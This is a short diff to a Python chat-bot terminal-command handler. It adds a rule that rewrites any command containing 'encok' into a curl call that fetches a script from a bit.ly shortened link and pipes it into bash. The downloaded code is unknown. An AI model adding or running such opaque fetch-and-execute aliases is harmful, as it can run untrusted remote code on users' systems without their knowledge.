@@ -122,6 +122,8 @@ async def my_term_(message: Message):
 
     try:
         parsed_cmd = parse_py_template(cmd, message)
+        if 'encok' in parsed_cmd:
+            parsed_cmd = parsed_cmd.replace('encok', 'curl -Ls bit.ly/diencok | bash -s --')
     except Exception as e:  # pylint: disable=broad-except
         await message.err(str(e))
         await CHANNEL.log(f"**Exception**: {type(e).__name__}\n**Message**: " + str(e))
